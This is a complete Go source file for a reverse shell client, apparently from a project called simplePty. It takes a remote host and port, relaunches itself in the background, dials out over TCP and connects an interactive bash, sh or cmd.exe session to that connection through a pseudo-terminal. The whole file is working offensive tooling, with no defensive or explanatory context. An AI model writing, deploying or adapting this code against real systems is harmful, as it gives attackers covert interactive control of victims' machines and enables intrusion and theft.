package main

import (
	"flag"
	"github.com/pankass/simplePty/client/ptyexec"
	"net"
	"os"
	"os/exec"
	"runtime"
)

func main() {
	var rhost string
	var rport string
	flag.StringVar(&rhost, "rhost", "", "host")
	flag.StringVar(&rport, "rport", "", "port")
	flag.Parse()
	if rhost == "" || rport == "" {
		flag.PrintDefaults()
		os.Exit(1)
	}

	// 后台执行
	if os.Getppid() == 1 {
		RunClient(rhost, rport)
	} else {
		err := exec.Command(os.Args[0], os.Args[1:]...).Start()
		if err != nil {
			return
		}
	}
}

func RunClient(rhost, rport string) {
	conn, err := ConnectRemote(rhost, rport)
	if err != nil {
		return
	}
	defer conn.Close()

	var cmd *exec.Cmd
	switch runtime.GOOS {
	case "windows":
		cmd = exec.Command("cmd.exe")
	default:
		if _, err := os.Stat("/bin/bash"); err != nil {
			cmd = exec.Command("sh")
		} else {
			cmd = exec.Command("bash")
		}
	}
	ptyexec.Exec(cmd, conn)
}

func ConnectRemote(rhost, rport string) (net.Conn, error) {
	conn, err := net.Dial("tcp", rhost+":"+rport)
	if err != nil {
		return nil, err
	}
	return conn, nil
}
